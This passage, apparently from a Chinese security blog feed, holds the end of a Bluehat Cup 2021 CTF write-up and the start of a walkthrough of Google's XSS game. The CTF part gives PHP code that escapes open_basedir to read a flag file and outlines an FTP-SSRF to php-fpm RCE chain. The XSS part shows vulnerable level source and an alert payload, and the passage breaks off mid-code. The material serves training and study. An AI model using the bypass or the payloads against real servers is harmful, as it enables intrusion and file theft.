class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>直接运行</p><img src="/article/bluehat2021/image-20210503145751850.png" class="" title="flag" loading="lazy"><p>GET IT</p><p>关于phpfpm与FastCGI模式的研究建议仔细看看部分参考文章，总的来说就是</p><p>FastCGI加载并调用hpdoger.so-&gt;bypass base_opendir-&gt;ftp-ssrf请求恶意ftp服务-&gt;本地php-fpm-&gt;rce</p><hr><p>参考文章：</p><p><a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">Ha1c9on</a></p><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">PHP绕过open_basedir列目录的研究</a></p><p><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a></p><p><a href="https://xz.aliyun.com/t/5598">php-fpm的攻击方式</a></p><p><a href="https://www.cnblogs.com/leixiao-/p/10226633.html">PHP-FPM Fastcgi 未授权访问漏洞</a></p><p><a href="https://www.anquanke.com/post/id/186186#h3-3">Fastcgi绕过姿势</a></p><p><a href="https://www.anquanke.com/post/id/233454">利用ftp 与 php-fpm 对话 RCE</a></p><p><a href="https://buuoj.cn/challenges#[%E8%93%9D%E5%B8%BD%E6%9D%AF%202021]One%20Pointer%20PHP">复现平台buuoj</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;深入学习蓝帽杯web一道题&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
  </entry>
  
  <entry>
    <title>xss学习</title>
    <link href="https://err0r.top/article/xss/"/>
    <id>https://err0r.top/article/xss/</id>
    <published>2021-04-24T05:24:44.000Z</published>
    <updated>2021-04-26T07:17:46.910Z</updated>
    
    <content type="html"><![CDATA[<p>谷歌的小游戏，复习一下xss</p><a id="more"></a><p>项目地址：<a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><a href="https://xss-game.appspot.com/level1/frame">https://xss-game.appspot.com/level1/frame</a></p><pre class="language-python" data-language="python"><code class="language-python">page_header <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!doctype html>&lt;html>  &lt;head>    &lt;!-- Internal game scripts/styles, mostly boring stuff -->    &lt;script src="/static/game-frame.js">&lt;/script>    &lt;link rel="stylesheet" href="/static/game-frame-styles.css" />  &lt;/head>   &lt;body id="level1">    &lt;img src="/static/logos/level1.png">      &lt;div>"""</span> page_footer <span class="token operator">=</span> <span class="token triple-quoted-string string">"""    &lt;/div>  &lt;/body>&lt;/html>"""</span> main_page_markup <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;form action="" method="GET">  &lt;input id="query" name="query" value="Enter query here..."    onfocus="this.value=''">  &lt;input id="button" type="submit" value="Search">&lt;/form>"""</span> <span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_string</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># Show main search page</span>      self<span class="token punctuation">.</span>render_string<span class="token punctuation">(</span>page_header <span class="token operator">+</span> main_page_markup <span class="token operator">+</span> page_footer<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      query <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">,</span> <span class="token string">'[empty]'</span><span class="token punctuation">)</span>             <span class="token comment"># Our search engine broke, we found no results :-(</span>      message <span class="token operator">=</span> <span class="token string">"Sorry, no results were found for &lt;b>"</span> <span class="token operator">+</span> query <span class="token operator">+</span> <span class="token string">"&lt;/b>."</span>      message <span class="token operator">+=</span> <span class="token string">" &lt;a href='?'>Try again&lt;/a>."</span>       <span class="token comment"># Display the results page</span>      self<span class="token punctuation">.</span>render_string<span class="token punctuation">(</span>page_header <span class="token operator">+</span> message <span class="token operator">+</span> page_footer<span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>关键部分</p><pre class="language-python" data-language="python"><code class="language-python">query <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query'</span><span class="token punctuation">,</span> <span class="token string">'[empty]'</span><span class="token punctuation">)</span>             <span class="token comment"># Our search engine broke, we found no results :-(</span>      message <span class="token operator">=</span> <span class="token string">"Sorry, no results were found for &lt;b>"</span> <span class="token operator">+</span> query <span class="token operator">+</span> <span class="token string">"&lt;/b>."</span>      message <span class="token operator">+=</span> <span class="token string">" &lt;a href='?'>Try again&lt;/a>."</span></code></pre><p><code>Sorry, no results were found for &lt;b&gt; + query + &lt;/b&gt;.</code></p><p>GET请求query会直接填入网页html</p><img src="/article/xss/image-20210424143837616.png" class="" title="level1-1" loading="lazy"><p>直接打即可，payload:</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><img src="/article/xss/image-20210424143953579.png" class="" title="level1-2" loading="lazy"><hr><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><a href="https://xss-game.appspot.com/level2/frame">https://xss-game.appspot.com/level2/frame</a></p><p>源码·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token comment">&lt;!-- This is our database of messages --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/post-store.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">var</span> defaultMessage <span class="token operator">=</span> <span class="token string">"Welcome!&lt;br>&lt;br>This is your &lt;i>personal&lt;/i>"</span>        <span class="token operator">+</span> <span class="token string">" stream. You can post anything you want here, especially "</span>        <span class="token operator">+</span> <span class="token string">"&lt;span style='color: #f00ba7'>madness&lt;/span>."</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> <span class="token constant">DB</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PostDB</span><span class="token punctuation">(</span>defaultMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">function</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> containerEl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"post-container"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>         <span class="token keyword">var</span> posts <span class="token operator">=</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">getPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>posts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">'&lt;table class="message"> &lt;tr> &lt;td valign=top> '</span>            <span class="token operator">+</span> <span class="token string">'&lt;img src="/static/level2_icon.png"> &lt;/td> &lt;td valign=top '</span>            <span class="token operator">+</span> <span class="token string">' class="message-container"> &lt;div class="shim">&lt;/div>'</span><span class="token punctuation">;</span>           html <span class="token operator">+=</span> <span class="token string">'&lt;b>You&lt;/b>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;span class="date">'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>date<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/span>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;blockquote>"</span> <span class="token operator">+</span> posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>message <span class="token operator">+</span> <span class="token string">"&lt;/blockquote"</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;/td>&lt;/tr>&lt;/table>"</span>          containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> html<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>       window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'clear-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> message <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>          <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>          document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'post-content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token function">displayPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>     </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level2.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Chatter from across the Web.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clear-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clear<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Clear all posts<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">valign</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/level2_icon.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>shim<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-content<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span>              <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>share<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Share status!<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sign<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Post-store.js</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">/* * Objects to implement a client-side post database. */</span> <span class="token keyword">function</span> <span class="token function">Post</span><span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>message <span class="token operator">=</span> message<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function">PostDB</span><span class="token punctuation">(</span><span class="token parameter">defaultMessage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Initial message to display to users</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>_defaultMessage <span class="token operator">=</span> defaultMessage <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">setup</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> defaultPost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Post</span><span class="token punctuation">(</span>defaultMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token string">"posts"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>defaultPost<span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">save</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">message<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> newPost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Post</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> allPosts <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    allPosts<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPost<span class="token punctuation">)</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token string">"posts"</span> <span class="token operator">:</span> allPosts    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">clear</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">getPosts</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>posts<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>关键代码</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>posts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token 